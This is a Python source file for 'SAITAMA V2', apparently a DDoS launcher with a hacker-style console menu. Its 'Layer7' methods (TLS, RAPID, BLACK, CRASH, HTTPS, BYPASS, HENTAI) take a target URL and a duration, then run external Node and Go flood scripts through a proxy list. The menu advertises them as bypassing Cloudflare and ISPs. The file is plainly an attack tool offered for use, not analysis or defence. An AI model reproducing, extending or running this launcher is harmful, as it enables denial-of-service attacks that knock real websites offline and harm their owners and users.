import subprocess
import httpx
import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA V2 | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")

def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white, ''' 

░█▀▀▀█ ─█▀▀█ ▀▀█▀▀ ─▀▀█▀▀ ░█▀▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▀▀█ ░█── ──░█── ░█─── ░█▀▀█ 
░█▄▄▄█ ░█──░█ ░█── ──░█── ░█▄▄█ ░█──░█

        LIST LAYER7 METHODS

!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE ATTACK
!HENTAI - BYPASS CLOUDFLARE WEBSITE

HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO SAITAMA V2 | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " | HAPPY TO USE"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⠀⠀
░█▀▀▀█ ─█▀▀█ ▀▀█▀▀ ─▀▀█▀▀ ░█▀▀█ ─█▀▀█ 
─▀▀▀▄▄ ░█▀▀█ ░█── ──░█── ░█─── ░█▀▀█ 
░█▄▄▄█ ░█──░█ ░█── ──░█── ░█▄▄█ ░█──░█

Type Layer7 To See Layer7 Methods⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))

def main():
    menu()
    while True:
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "root@shifat#~"))
        if cnc in ["layer7", "LAYER7", "L7", "l7"]:
            layer7()
        elif cnc in ["clear", "CLEAR", "CLS", "cls"]:
            main()
        elif cnc in ["ports", "port", "PORTS", "PORT"]:
            ports()
        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TLS.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "HENTAI" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HENTAI.js {host} {time} 100 10 proxy.txt 0 0 0 0 0 0 0 0 0 0 0 0 0')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: METHOD URL TIME')
        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def get_ip_address():
    result = subprocess.run(["curl", "-s", "ifconfig.me"], capture_output=True, text=True)
    return result.stdout.strip()

if __name__ == "__main__":
    main()
